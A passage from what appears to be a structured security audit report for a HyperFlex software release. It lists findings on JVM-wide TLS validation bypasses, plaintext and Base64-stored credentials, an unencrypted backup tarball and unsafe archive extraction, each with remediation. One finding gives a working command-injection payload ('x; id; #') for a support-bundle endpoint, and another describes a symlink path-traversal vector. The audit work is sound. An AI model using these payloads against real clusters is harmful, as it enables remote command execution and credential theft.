                "offset 3-10: new WebDownloader$2(), HttpsURLConnection.setDefaultHostnameVerifier(verifier) — "
                "JVM-wide hostname verifier override at static init."
            ),
            "trust_all_method_bytecode": (
                "WebDownloader.trustAllHttpsCertificates(): "
                "offset 7-14: new WebDownloader$TrustAllManager() — anonymous X509TrustManager. "
                "offset 15-17: SSLContext.getInstance('SSL'). "
                "offset 21-25: SSLContext.init(null, TrustManager[]{WebDownloader$TrustAllManager}, null). "
                "offset 28-32: HttpsURLConnection.setDefaultSSLSocketFactory(sslCtx.getSocketFactory()) — JVM-WIDE."
            ),
            "trust_manager_noop": (
                "WebDownloader$TrustAllManager implements javax.net.ssl.X509TrustManager: "
                "checkServerTrusted() → return (offset 0: return). "
                "checkClientTrusted() → return (offset 0: return). "
                "getAcceptedIssuers() → null (aconst_null; areturn)."
            ),
            "hostname_verifier_noop": (
                "WebDownloader$2 implements javax.net.ssl.HostnameVerifier: "
                "verify(String, SSLSession) → iconst_1; ireturn (always true)."
            ),
            "scope_and_activation": (
                "Difference from HX-F78: ROOT WAR WebDownloader overrides are set in the class static "
                "initializer, not in an instance method. Any class loader that loads WebDownloader (e.g., "
                "StorvisorSupportBundle or GenerationThread initializing it) triggers the global override. "
                "StorvisorSupportBundle.doGet/doPost → processRequest → WebDownloader.getStream() "
                "loads the class and fires the static init. "
                "Once set, all HttpsURLConnection in the ROOT WAR JVM have no TLS validation for the lifetime "
                "of the class (which is the lifetime of the JVM unless the class loader is discarded)."
            ),
        },
        "impact": (
            "Every HTTPS connection from the ROOT WAR JVM (management UI backend, "
            "stmgr Thrift, vCenter, upgrade download, support bundle fetch) "
            "accepts any certificate without chain or hostname validation from the point WebDownloader is first loaded. "
            "This is a second independent instance of the same vulnerability class as HX-F78, "
            "in a separate WAR and JVM process."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Remove WebDownloader.trustAllHttpsCertificates() and the class static initializer that calls it. "
            "Use a dedicated SSLContext pinned to the HyperFlex internal CA for ESXi host connections. "
            "The SSLContext should be per-connection or per-host, not set via setDefaultSSLSocketFactory(). "
            "Class-level static initializers are especially dangerous for security-affecting state: "
            "once the class is loaded, the bypass cannot be reverted from application code."
        ),
    },
    "HX-F83": {
        "title": (
            "HxSupportSvcClient.trustAll() Globally Disables TLS Certificate Validation in "
            "slservice-1.0.0 WAR JVM via HttpsURLConnection.setDefaultSSLSocketFactory()"
        ),
        "severity": "HIGH",
        "cvss": "7.4",
        "cwe": "CWE-295",
        "component": "slservice-1.0.0 WAR / HxSupportSvcClient / trustAll() / HxSupportSvcClient$1 / HxSupportSvcClient$2",
        "class": "TLS Certificate Validation Bypass — Third Global JVM Override in Smart Licensing WAR",
        "confirmed": True,
        "evidence": {
            "openClient_bytecode": (
                "HxSupportSvcClient.openClient(): "
                "offset 1: invokevirtual trustAll() — called before transport creation. "
                "offset 5: new THttpClient('https://localhost/hxsupportsvc'). "
                "offset 17: getRootSessionID(). "
                "offset 28: THttpClient.setCustomHeader('X-RootSessionID', rootSessionId). "
                "offset 34: new TBinaryProtocol(transport)."
            ),
            "trustAll_bytecode": (
                "HxSupportSvcClient.trustAll() (private): "
                "Creates SSLContext with HxSupportSvcClient$1 (no-op X509TrustManager). "
                "Calls HttpsURLConnection.setDefaultSSLSocketFactory(sslCtx.getSocketFactory()) — JVM-WIDE. "
                "Calls HttpsURLConnection.setDefaultHostnameVerifier(new HxSupportSvcClient$2()) — JVM-WIDE."
            ),
            "trust_manager_noop": (
                "HxSupportSvcClient$1 implements X509TrustManager: "
                "checkServerTrusted() → return (offset 0). getAcceptedIssuers() → null. "
                "HxSupportSvcClient$2 implements HostnameVerifier: verify() → iconst_1 (always true)."
            ),
            "service_context": (
                "HxSupportSvcClient connects to HxSupportSvc Thrift service at https://localhost/hxsupportsvc. "
                "Methods: slRegisterSync (Cisco Smart Licensing registration), slDeregister, "
                "slGetClusterLicenseTier, slGetAllStatus. "
                "Smart Licensing registration transmits license token data — "
                "after trustAll() sets global factory, any HTTPS connection in slservice-1.0.0 JVM loses cert validation."
            ),
        },
        "impact": (
            "Third independent instance of the HttpsURLConnection global TLS bypass pattern (HX-F78, HX-F82). "
            "All HTTPS connections from the slservice-1.0.0 JVM process — including Smart Licensing calls to "
            "Cisco's license server — are subject to TLS MITM after HxSupportSvcClient is first instantiated. "
            "License token data and cluster identity information transmitted to the license server can be "
            "intercepted and modified by a network-adjacent attacker without triggering any certificate error."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Remove trustAll(). Replace with a per-connection SSLContext configured with the appropriate "
            "CA bundle for the hxsupportsvc localhost endpoint. "
            "For Smart Licensing outbound calls, pin to Cisco's license server CA. "
            "Do not call setDefaultSSLSocketFactory/setDefaultHostnameVerifier. "
            "This is the third instance of the same pattern — address all four instances systematically "
            "with a shared utility class that enforces per-connection, CA-pinned SSL contexts."
        ),
    },
    "HX-F84": {
        "title": (
            "UpgradeSvcAccess.trustAll() Globally Disables TLS Certificate Validation in "
            "hxupgrade-1.0.0 WAR JVM via HttpsURLConnection.setDefaultSSLSocketFactory()"
        ),
        "severity": "HIGH",
        "cvss": "7.4",
        "cwe": "CWE-295",
        "component": "hxupgrade-1.0.0 WAR / UpgradeSvcAccess / trustAll() / UpgradeSvcAccess$1 / UpgradeSvcAccess$2",
        "class": "TLS Certificate Validation Bypass — Fourth Global JVM Override in Upgrade Service WAR",
        "confirmed": True,
        "evidence": {
            "openClientConnection_bytecode": (
                "UpgradeSvcAccess.openClientConnection(String url, HttpHeaders headers): "
                "offset 11: invokestatic trustAll() — called at connection open. "
                "offset 15-25: new THttpClient(InvokeDynamic url concat) — HTTPS THttpClient. "
                "offset 36-58: extracts Authorization header from HttpHeaders, "
                "sets THttpClient.setCustomHeader('Authorization', authHeader)."
            ),
            "trustAll_bytecode": (
                "UpgradeSvcAccess.trustAll() (public static): "
                "Creates SSLContext with UpgradeSvcAccess$1 (no-op X509TrustManager). "
                "offset 38: HttpsURLConnection.setDefaultSSLSocketFactory(sslCtx.getSocketFactory()) — JVM-WIDE. "
                "offset 50: HttpsURLConnection.setDefaultHostnameVerifier(new UpgradeSvcAccess$2()) — JVM-WIDE. "
                "NOTE: trustAll() is public static — callable from any context in the hxupgrade WAR."
            ),
            "trust_manager_noop": (
                "UpgradeSvcAccess$1 implements X509TrustManager: "
                "checkServerTrusted() → return. getAcceptedIssuers() → null. "
                "UpgradeSvcAccess$2 implements HostnameVerifier: verify() → true."
            ),
            "service_context": (
                "UpgradeSvcAccess connects to StUpgradeSvc Thrift service. "
                "Methods: upgradeService(HxClusterUpgradeThriftPayload), checkClusterUpgradeValidations, "
                "checkUpgradeService, getClusterVersionDetails, getUcsHfpVersions. "
                "trustAll() is invoked on every openClientConnection() call. "
                "The upgrade payload contains cluster topology and version data — "
                "MITM against the upgrade Thrift channel could redirect upgrade source or corrupt cluster state."
            ),
        },
        "impact": (
            "Fourth independent instance of the HttpsURLConnection global TLS bypass pattern (HX-F78, HX-F82, HX-F83). "
            "All HTTPS connections from the hxupgrade-1.0.0 JVM after UpgradeSvcAccess is first instantiated "
            "lose TLS certificate validation. "
            "UpgradeSvcAccess.trustAll() is public static — it is also callable directly by any code in "
            "the hxupgrade WAR class space. "
            "Upgrade operations (firmware upgrades, cluster expansion validation, UCS HFP version checks) "
            "are subject to MITM without any certificate error, enabling supply chain interference "
            "in the firmware update path."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Remove trustAll(). Scope the SSLContext to a per-connection factory pinned to the upgrade "
            "service's CA. trustAll() being public static amplifies risk — remove the method entirely "
            "rather than making it private. "
            "All four instances (HX-F78, HX-F82, HX-F83, HX-F84) share the same root cause: "
            "use of HttpsURLConnection.setDefaultSSLSocketFactory/setDefaultHostnameVerifier for a "
            "convenience disable. Address systematically with a shared HttpClientFactory that "
            "always returns CA-pinned, per-connection SSL contexts."
        ),
    },
    "HX-F85": {
        "title": (
            "HxSecuritySvcMgrClient.trustAll() Globally Disables TLS Certificate Validation in "
            "securityservice-1.0.0 WAR JVM via HttpsURLConnection.setDefaultSSLSocketFactory()"
        ),
        "severity": "HIGH",
        "cvss": "7.4",
        "cwe": "CWE-295",
        "component": "securityservice-1.0.0 WAR / HxSecuritySvcMgrClient / trustAll() / HxSecuritySvcMgrClient$1 / HxSecuritySvcMgrClient$2",
        "class": "TLS Certificate Validation Bypass — Fifth Global JVM Override in Security Service WAR",
        "confirmed": True,
        "evidence": {
            "trustAll_bytecode": (
                "HxSecuritySvcMgrClient.trustAll() (private): "
                "Creates TrustManager[] array with HxSecuritySvcMgrClient$1 (no-op X509TrustManager). "
                "offset 39: invokestatic HttpsURLConnection.setDefaultSSLSocketFactory(sslCtx.getSocketFactory()) — JVM-WIDE. "
                "offset 52: invokestatic HttpsURLConnection.setDefaultHostnameVerifier(new HxSecuritySvcMgrClient$2()) — JVM-WIDE. "
                "$1.checkServerTrusted() → return; $1.getAcceptedIssuers() → null. "
                "$2.verify() → iconst_1 (always true)."
            ),
            "openClientHttp_bytecode": (
                "openClientHttp(String host): "
                "offset 1: invokevirtual trustAll() — first instruction before transport construction. "
                "offset 9-15: new THttpClient('http://localhost:8055') when host is null. "
                "offset 25-35: new THttpClient(InvokeDynamic 'http://\\u0001:8055') when host provided. "
                "NOTE: Thrift transport is plain HTTP to port 8055, not HTTPS. "
                "trustAll() side-effect globally disables TLS validation for all other HTTPS connections "
                "in the securityservice WAR JVM."
            ),
            "thrift_service": "hxSecuritySvcMgr — port 8055; THttpClient (HTTP)",
            "service_scope": (
                "HxSecuritySvcMgrClient methods exposed to the JVM bypass: "
                "backupDareKeys(THxSoftwareEncryptionBackupConfig), "
                "restoreDareKeys(THxSoftwareEncryptionRestoreConfig), "
                "checkSoftwareEncryptionCapable(String), "
                "updateNtpServers(List<HxNtpServer>, String), clearNtpServers(String), "
                "updateAuthBanner(String), applySTIG(String), changePassword(String, String, String), "
                "updateSshConcurrentLoginLimit(int), updateSshIdleTimeout(int), updateSshBrokenTimeout(int). "
                "Any HTTPS call made by this WAR after first openClientHttp() is unvalidated."
            ),
        },
        "impact": (
            "Fifth independent instance of the HttpsURLConnection global TLS bypass pattern "
            "(HX-F78, HX-F82, HX-F83, HX-F84). "
            "The securityservice WAR manages DARE encryption keys, NTP servers, SSH policy, STIG application, "
            "password policy, and auth banners — the highest-sensitivity management plane in HyperFlex. "
            "All HTTPS connections from this JVM after first client instantiation lose certificate validation, "
            "exposing DARE key backup/restore operations and credential-bearing management traffic to MITM. "
            "Unlike HX-F84 where trustAll() was public static, here it is private but still invoked on "
            "every openClientHttp() call, meaning it re-runs the global override each time a new client opens."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Remove trustAll(). The Thrift transport to hxSecuritySvcMgr is HTTP (port 8055, localhost-only); "
            "the global SSL bypass serves no purpose for this transport. "
            "Scope any needed SSL context to external HTTPS calls using per-connection SSLSocketFactory. "
            "This is the fifth instance of the same pattern across five WARs — "
            "address systemically (see HX-F78 remediation)."
        ),
    },
    "HX-F86": {
        "title": (
            "SupportbundleApiServiceImpl generateAndDeliverSupportBundle 'manifestFile' Parameter "
            "Unsanitized Interpolation into Shell Command Enables OS Command Injection on All Cluster Nodes"
        ),
        "severity": "CRITICAL",
        "cvss": "9.9",
        "cwe": "CWE-78",
        "component": (
            "supportservice-1.0.0 WAR / SupportbundleApiServiceImpl / "
            "generateAndDeliverSupportBundle(AsupCliConfiguration) / "
            "GenerationThread.run() / HxSupportSvcClient.executeCmd()"
        ),
        "class": "OS Command Injection — manifestFile Interpolated into Shell Command Sent to All Cluster VMs",
        "confirmed": True,
        "evidence": {
            "injection_point": (
                "AsupCliConfiguration.getManifestFile() → local var 6 in generateAndDeliverSupportBundle. "
                "Constant pool #770/#771: 'asupcli post --type custom-asup --manifestfile \\u0001' — "
                "makeConcatWithConstants at offset 544 interpolates manifestFile directly into command string. "
                "No validation, no character filtering: only null and length > 0 checks (offsets 531-539). "
                "Trigger: type == 'custom-asup' AND manifestFile != null AND len > 0."
            ),
            "execution_chain": (
                "generateAndDeliverSupportBundle offset 581-603: "
                "new GenerationThread(this, cmd, type, genStatus, config).start(). "
                "GenerationThread.run() offset 175-180: "
                "invokevirtual HxSupportSvcClient.executeCmd(this.cmd, nodeList). "
                "HxSupportSvcClient.executeCmd() offset 14-20: "
                "invokevirtual HxSupportSvc$Client.runCmdInAllVm(String cmd, List<String> args) — Thrift RPC."
            ),
            "shell_execution_proof": (
                "GenerationThread.run() offset 87: ldc 'ps aux | grep \\'[a]supcli generate --type\\'' — "
                "pipe and shell quoting syntax proves hxSupportSvc daemon executes commands via shell. "
                "Constant pool #762/#763: 'nohup asupcli generate --type \\u0001 > /dev/null 2>&1 &' — "
                "nohup, stdout redirection, and background execution operator are shell-only constructs."
            ),
            "cluster_wide_impact": (
                "HxSupportSvc$Client.runCmdInAllVm() — method name 'InAllVm' indicates command is "
                "dispatched to all virtual machines in the cluster via the hxSupportSvc Thrift service. "
                "A single authenticated request injects commands on every node simultaneously."
            ),
            "payload_example": (
                "POST /v1/supportbundle body: "
                "{\"action\":\"generate\", \"type\":\"custom-asup\", \"manifestFile\":\"x; id; #\"} "
                "→ shell executes: asupcli post --type custom-asup --manifestfile x; id; # "
                "→ 'id' runs as the hxSupportSvc service user on every cluster node."
            ),
        },
        "impact": (
            "Authenticated attacker with any valid HyperFlex management credential can inject arbitrary OS "
            "commands that execute on ALL cluster nodes simultaneously. "
            "The hxSupportSvc daemon runs with sufficient privilege to access cluster state and credentials. "
            "Shell metacharacters (;, &&, |, $(), backtick) in the manifestFile parameter are not filtered "
            "before insertion into the command string, and the hxSupportSvc daemon executes via shell "
            "(confirmed by pipe/nohup/redirection usage in adjacent code paths). "
            "Authentication is required but any valid management user (not just admin) can trigger this endpoint."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Validate manifestFile against an allow-list of permitted characters before interpolation "
            "(alphanumeric, hyphen, dot, forward slash only). "
            "Alternatively, pass manifestFile as a separate Thrift argument rather than interpolating "
            "it into a command string — the executeCmd signature accepts List<String> args for this purpose. "
            "Do not construct shell command strings from user input; pass parameters as positional arguments "
            "to a structured Thrift call that the daemon executes without shell interpretation."
        ),
    },
    "HX-F87": {
        "title": (
            "supportservice-1.0.0 WAR Contains Three Independent trustAll() Implementations "
            "Each Globally Disabling TLS Certificate Validation via HttpsURLConnection JVM Override"
        ),
        "severity": "HIGH",
        "cvss": "7.4",
        "cwe": "CWE-295",
        "component": (
            "supportservice-1.0.0 WAR / HxSupportSvcClient / HxSvcMgrClient / StMgrClient — "
            "three independent trustAll() implementations, each with inner-class $1 (X509TrustManager) "
            "and $2 (HostnameVerifier) no-op bypass"
        ),
        "class": "TLS Certificate Validation Bypass — Three Concurrent Global JVM Overrides in Support Service WAR",
        "confirmed": True,
        "evidence": {
            "HxSupportSvcClient": (
                "trustAll() offsets 39/52: HttpsURLConnection.setDefaultSSLSocketFactory + setDefaultHostnameVerifier JVM-WIDE. "
                "openClient() offset 1: invokevirtual trustAll() before THttpClient('https://localhost/hxsupportsvc')."
            ),
            "HxSvcMgrClient": (
                "trustAll() offsets 39/52: same global JVM override pattern. "
                "openClientHttp() offset 1: invokevirtual trustAll() before THttpClient('http://\\u0001:9341'). "
                "Thrift transport to hxSvcMgr on port 9341 is plain HTTP — bypass has no purpose for this transport "
                "but globally disables TLS validation for all other HTTPS connections in the WAR JVM."
            ),
            "StMgrClient": (
                "trustAll() offsets 39/52: same global JVM override pattern. "
                "openClient() offset 1: invokevirtual trustAll() before THttpClient('https://localhost/stmgr'). "
                "This is the sixth instance of the StMgrClient pattern (HX-F78 in encryption WAR, "
                "this instance in supportservice WAR)."
            ),
            "cumulative_scope": (
                "Each time any of the three client classes opens a connection, it re-executes the global JVM "
                "SSLSocketFactory and HostnameVerifier overrides. In the supportservice JVM, whichever client "
                "is instantiated first sets the global state; all subsequent clients reinforce it. "
                "All HTTPS connections from the supportservice JVM — including any external call-home, "
                "certificate fetch, or vendor ASUP upload channel — lose TLS validation."
            ),
        },
        "impact": (
            "Three independent trustAll() implementations in the support service WAR compound the global JVM "
            "TLS bypass. The support service handles ASUP (automated support protocol) uploads, support bundle "
            "delivery, and remote support configuration — all outbound channels that may carry system state "
            "or telemetry to external endpoints. MITM against any of these channels is undetectable. "
            "This is the sixth (StMgrClient), seventh (HxSupportSvcClient), and eighth (HxSvcMgrClient) "
            "independent instances of this pattern across the HyperFlex WAR deployment."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Remove all three trustAll() implementations. "
            "HxSvcMgrClient connects to HTTP (port 9341) — no SSL override is needed at all. "
            "HxSupportSvcClient and StMgrClient connect to HTTPS localhost; "
            "use a pinned CA-specific SSLSocketFactory scoped to the connection, not the JVM default. "
            "This is the sixth, seventh, and eighth instance of the same root cause (see HX-F78 remediation)."
        ),
    },
    "HX-F88": {
        "title": (
            "iscsi-1.0.0 WAR Contains Four Independent trustAll() Implementations "
            "Each Globally Disabling TLS Certificate Validation via HttpsURLConnection JVM Override"
        ),
        "severity": "HIGH",
        "cvss": "7.4",
        "cwe": "CWE-295",
        "component": (
            "iscsi-1.0.0 WAR / HxIscsiMgrClient / HxSvcMgrClient / StMgrClient / HxIscsiCloneMgrClient — "
            "four independent trustAll() implementations, each with inner-class $1 (X509TrustManager) "
            "and $2 (HostnameVerifier) no-op bypass"
        ),
        "class": "TLS Certificate Validation Bypass — Four Concurrent Global JVM Overrides in iSCSI Service WAR",
        "confirmed": True,
        "evidence": {
            "HxIscsiMgrClient": (
                "trustAll() offset 39: invokestatic HttpsURLConnection.setDefaultSSLSocketFactory — JVM-WIDE. "
                "offset 52: invokestatic HttpsURLConnection.setDefaultHostnameVerifier — JVM-WIDE. "
                "openClientHttp() connects to hxIscsiMgr at localhost:9342 via THttpClient."
            ),
            "HxSvcMgrClient": (
                "trustAll() offsets 39/52: same global JVM override pattern. "
                "openClientHttp() connects to hxSvcMgr (sysmgmt.stSSOMgrHost) via THttpClient."
            ),
            "StMgrClient": (
                "trustAll() offsets 39/52: same global JVM override pattern. "
                "openClientHttp() connects to stMgr at localhost:9333 via THttpClient. "
                "Seventh StMgrClient instance of this pattern across HyperFlex WARs."
            ),
            "HxIscsiCloneMgrClient": (
                "trustAll() offsets 39/52: same global JVM override pattern. "
                "openClientHttp() connects to hxCloneSvcMgr at localhost:9347 via THttpClient."
            ),
            "application_conf": (
                "Ports confirmed: hxIscsiMgrPort=9342, stMgrPort=9333, hxCloneSvcMgrPort=9347. "
                "All targets are localhost Thrift services. "
                "trustAll() is called before every openClientHttp()/openClient() invocation."
            ),
        },
        "impact": (
            "Four independent trustAll() implementations in the iSCSI WAR — the largest concentration "
            "in any single HyperFlex WAR analyzed. iSCSI handles storage target provisioning, initiator "
            "group management, LUN configuration, and clone operations — all storage-plane control paths. "
            "MITM against any HTTPS connection from this JVM (including any certificate retrieval, "
            "external notification, or management plane call-home) is undetectable. "
            "This is the ninth through twelfth independent instance of this pattern across the HyperFlex WAR fleet "
            "(HX-F78, HX-F82, HX-F83, HX-F84, HX-F85, HX-F87 enumerate the prior eight instances)."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Remove all four trustAll() implementations. "
            "Use a pinned CA-specific SSLSocketFactory scoped per-connection, not the JVM default. "
            "This is the ninth through twelfth instance of the same root cause across the HyperFlex WAR fleet. "
            "A single shared fix — a correctly-scoped TrustManager factory utility — should replace all 12 instances "
            "across encryption, ROOT, slservice, hxupgrade, securityservice, supportservice, and iscsi WARs. "
            "See HX-F78 remediation for the authoritative fix template."
        ),
    },
    "HX-F89": {
        "title": (
            "SedUcsmReadonlyUserMgr Stores Plaintext UCSM Credentials "
            "(ucsmHostName + username + password) in ZooKeeper with OPEN_ACL_UNSAFE"
        ),
        "severity": "HIGH",
        "cvss": "7.5",
        "cwe": "CWE-312",
        "component": (
            "stmgr / SedUcsmReadonlyUserMgr / StClusterEncryptionUcsmReadonlyUser Thrift struct / "
            "ZooKeeper ServiceDiscovery at /storvisor/ basePath with OPEN_ACL_UNSAFE"
        ),
        "class": "Cleartext Storage of Sensitive Information in World-Readable ZooKeeper Path",
        "confirmed": True,
        "evidence": {
            "credential_struct": (
                "StClusterEncryptionUcsmReadonlyUser Thrift struct fields (bytecode-verified): "
                "ucsmHostName:String, username:String, password:String. "
                "All three fields are public instance members. "
                "Serialized via TJSONProtocol (plaintext JSON) by SedUcsmReadonlyUserMgrSerializer."
            ),
            "zk_path": (
                "SedUcsmReadonlyUserMgr.init() registers via Curator ServiceDiscovery. "
                "basePath = StMgrImpl.BASE_PATH = '/storvisor'. "
                "Service discovery path: /storvisor/SedUcsmReadonlyUserMgr/instances/<uuid>. "
                "Payload = JSON-serialized StClusterEncryptionUcsmReadonlyUser including plaintext password."
            ),
            "acl_context": (
                "ZooKeeper cluster uses OPEN_ACL_UNSAFE (Id='world', Perms=ALL). "
                "See HX-F55 (ZK OPEN_ACL_UNSAFE). "
                "Any process with TCP access to ZK port 2181 can read /storvisor/... without credentials."
            ),
            "credential_role": (
                "These are UCSM (UCS Manager) readonly credentials used for "
                "drive encryption key management (SED — Self-Encrypting Drive). "
                "Access to UCSM management plane from these credentials enables reading drive "
                "encryption policy configuration and potentially key management parameters."
            ),
        },
        "impact": (
            "Plaintext UCSM management plane credentials stored in world-readable ZooKeeper. "
            "Any process on the HyperFlex cluster — or any host with network access to ZK port 2181 "
            "that is not blocked by iptables rules — can retrieve UCSM hostname, username, and password "
            "without authentication. UCSM access via these credentials enables inspection of drive "
            "encryption policy configuration and may expose additional management plane attack surface. "
            "Compounded by HX-F55 (OPEN_ACL_UNSAFE on all ZK nodes) and HX-F69 (auth permanently disabled)."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Store UCSM credentials in the StorvisorKeystore (AES-encrypted JKS at "
            "/etc/hyperflex_shadow — see HX-F41) rather than in ZooKeeper. "
            "If ZooKeeper storage is required, encrypt the credential payload before storing "
            "and decrypt only at retrieval time; do not store plaintext JSON. "
            "Additionally, restrict ZooKeeper access to localhost or cluster-internal IPs only "
            "and apply proper ACLs (see HX-F55 remediation). "
            "Rotate UCSM readonly credentials after any disclosure event."
        ),
    },
    "HX-F90": {
        "title": (
            "StDeployImpl.getEncodedPassword() Uses Base64 Only (Not Encryption) — "
            "Six Infrastructure Credential Types Written to /tmp/virtInfoXXXXXX.json "
            "and Passed as CLI Arguments During Cluster Deployment"
        ),
        "severity": "HIGH",
        "cvss": "7.1",
        "cwe": "CWE-312",
        "component": (
            "stmgr / StDeployImpl / getEncodedPassword / setupScriptConfigurationFiles / "
            "setupVirtInfoConfigFile / postInstallControllerVMScript — deployment path credential handling"
        ),
        "class": "Cleartext Storage of Sensitive Information — Base64 Mistaken for Encryption in Deployment Pipeline",
        "confirmed": True,
        "evidence": {
            "getEncodedPassword_impl": (
                "StDeployImpl.getEncodedPassword(String): "
                "Code: aload_1; invokestatic Base64.encodeBase64String(input.getBytes()); areturn. "
                "Method performs Base64.encodeBase64String(input.getBytes()) — reversible encoding, not encryption. "
                "Used at 18+ call sites across setupScriptConfigurationFiles, setupVirtInfoConfigFile, "
                "and postInstallControllerVMScript lambda functions."
            ),
            "credentials_encoded": (
                "Six credential fields from VirtClusterParams processed via getEncodedPassword: "
                "VirtClusterParams.esxPassword (ESXi host password, offset 80), "
                "VirtClusterParams.vCenterPassword (offset 98), "
                "VirtClusterParams.ctlvmPassword (offset 116), "
                "VirtClusterParams.ucsmPassword (offset 139), "
                "VirtClusterParams.cimcPassword (offset 162), "
                "VirtClusterParams.esxNewPassword (offset 185). "
                "Hyper-V branch additionally encodes: ctlvmPassword (offset 625), "
                "HxHypervDetails.localAdminPassword (offset 652), "
                "ActiveDirectoryDetails.domainAdminPassword (offset 674), "
                "ActiveDirectoryDetails.hxAdminPassword (offset 687), "
                "ActiveDirectoryDetails.cdUserPassword (offset 700)."
            ),
            "file_write": (
                "$anonfun$setupScriptConfigurationFiles$1 / $anonfun$setupVirtInfoConfigFile$1: "
                "Base64-replaced VirtClusterParams copy serialized via JsonThriftSerializer.toString() "
                "and written to File.createTempFile('virtInfo', '.json') via FileUtils.writeStringToFile(). "
                "NetworkSettings JSON written to File.createTempFile('networkSettings', '.json'). "
                "Both files in JVM default temp directory (typically /tmp). "
                "Files deleted after use via deleteScriptConfigurationFiles -> deleteWithRetry -> "
                "FileUtils.deleteQuietly(), but deletion is best-effort (exception before cleanup leaves files)."
            ),
            "cli_argument": (
                "$anonfun$postInstallControllerVMScript$7: constructs command-line list "
                "[script_path, '--json-config-file-networking', <networkSettings_file_path>, "
                "'--ctlvmPassword', getEncodedPassword(ctlvmPassword), '--workFlowType', <type>] "
                "and executes via scala.sys.process.stringSeqToProcess().lines(). "
                "Base64-encoded ctlvmPassword visible in /proc/<pid>/cmdline and audit logs during execution."
            ),
            "sanitize_context": (
                "sanitizeIfNotDebugMode(VirtClusterParams) called before debug log at offset 34 "
                "in setupVirtInfoConfigFile$1 — plaintext redacted from debug logs only. "
                "The JSON file write and CLI invocation use the Base64 version regardless of log level."
            ),
        },
        "impact": (
            "All six infrastructure credential types (ESXi, vCenter, CTLVM, UCSM, CIMC, ESXi-new) "
            "are written in Base64 form to temporary files in /tmp during cluster deployment. "
            "Base64 is trivially reversible: `echo <value> | base64 -d` recovers plaintext. "
            "CTLVM password additionally exposed as command-line argument visible in /proc/<pid>/cmdline "
            "for the duration of the deployment script execution. "
            "Deletion is best-effort — exception path leaves virtInfo*.json and networkSettings*.json on disk. "
            "Any local process running as any user can read /tmp files (world-readable by default) and "
            "decode all credentials. Post-exploitation combined with HX-F55 (ZK open ACLs) and "
            "HX-F89 (UCSM creds in ZK) enables full cluster credential harvest in a single pass."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Replace Base64 with AES-GCM encryption using the StorvisorKeystore key (see HX-F41) "
            "for all credential fields before writing to temporary files or passing to deployment scripts. "
            "Write temporary credential files with mode 0600 (owner-only). "
            "Pass credentials via environment variables or a secure IPC channel instead of CLI arguments "
            "to avoid /proc/pid/cmdline exposure. "
            "Ensure cleanup runs in a finally block to guarantee deletion even on exception paths."
        ),
    },
    "HX-F91": {
        "title": (
            "connector_ctl backup Produces Unencrypted Tarball of connector.db "
            "Containing Intersight AccessKeyId and AccessKey — Planned Encryption Not Implemented"
        ),
        "severity": "HIGH",
        "cvss": "6.5",
        "cwe": "CWE-312",
        "component": (
            "hxdp Intersight Device Connector / connector_ctl backup operation / "
            "connector.db SQLite database at <install-location>/db/connector.db"
        ),
        "class": "Cleartext Storage of Sensitive Information — Incomplete Security Control Implementation",
        "confirmed": True,
        "evidence": {
            "backup_command": (
                "connector_ctl backup <install-location> <target-dir>: "
                "Line 42: 'tar -czf $3/connector.tgz $2/db/connector.db'. "
                "Produces unencrypted gzip tarball of connector.db. "
                "Line 44: '# TODO - encrypt pkg' — encryption was planned but not implemented."
            ),
            "credential_scope": (
                "connector.db contains Intersight cloud management API credentials: "
                "AccessKeyId and AccessKey (Intersight API key pair). "
                "Confirmed by tech_support operation (line 23-24): "
                "'sed /AccessKeyId/d $3/connector.db > ... && sed /AccessKey/d $3/connector.db > ...' "
                "which explicitly strips these fields from tech-support output — "
                "confirming their presence and sensitivity."
            ),
            "contrast_with_tech_support": (
                "tech_support operation redacts AccessKeyId and AccessKey before copying. "
                "backup operation copies connector.db WITHOUT redaction or encryption. "
                "The asymmetry indicates the developer recognized credential sensitivity "
                "for tech-support bundles but left the backup path unprotected."
            ),
            "backup_location": (
                "Backup written to $3/connector.tgz where $3 is caller-supplied target directory. "
                "No access controls enforced on the output tarball."
            ),
        },
        "impact": (
            "Any user or process with read access to the backup target directory can extract "
            "connector.tgz and recover Intersight API credentials (AccessKeyId + AccessKey) in plaintext. "
            "Intersight API access enables full remote management plane control: "
            "cluster configuration, firmware upgrade orchestration, policy enforcement, "
            "and potentially pivoting to other Cisco-managed infrastructure registered with the same Intersight account. "
            "Backups are likely written to NFS-mounted shared storage (/nfs/SYSTEM/) accessible to all cluster nodes."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Implement the planned encryption for backup tarballs — use AES-GCM with a key derived "
            "from the StorvisorKeystore (see HX-F41) or a cluster-unique backup key. "
            "As an interim measure, redact AccessKeyId and AccessKey from the backup using the same "
            "sed filtering already implemented for tech_support output. "
            "Set restrictive permissions (0600) on the output tarball. "
            "Remove the TODO comment and enforce the security control before release."
        ),
    },
    "HX-F92": {
        "title": (
            "connector_ctl restore Extracts Untrusted Tarball Directly to Filesystem Root "
            "with No Integrity Verification — Arbitrary File Write via Crafted Tarball"
        ),
        "severity": "HIGH",
        "cvss": "7.8",
        "cwe": "CWE-22",
        "component": (
            "hxdp Intersight Device Connector / connector_ctl restore operation / "
            "tar extraction to -C / (filesystem root)"
        ),
        "class": "Path Traversal via Unsafe Archive Extraction — Arbitrary File Write",
        "confirmed": True,
        "evidence": {
            "restore_command": (
                "connector_ctl restore <install-location> <source-config>: "
                "Line 62: 'tar xzf $3 -C /'. "
                "Extracts the caller-supplied tarball ($3) directly to the filesystem root (/). "
                "No integrity check (no signature, no HMAC, no hash comparison). "
                "No path sanitization of tarball entries before extraction."
            ),
            "no_decryption": (
                "Line 58: '# TODO - decrypt'. "
                "Decryption was planned but not implemented — confirming the TODO in backup/restore pair. "
                "Absence of decryption means any tarball is accepted regardless of origin."
            ),
            "path_traversal_vector": (
                "GNU tar with -C / extracts entries relative to /. "
                "Tarball entries with symlinks (e.g., 'db -> /etc/cron.d') redirect subsequent "
                "file writes to arbitrary filesystem paths. "
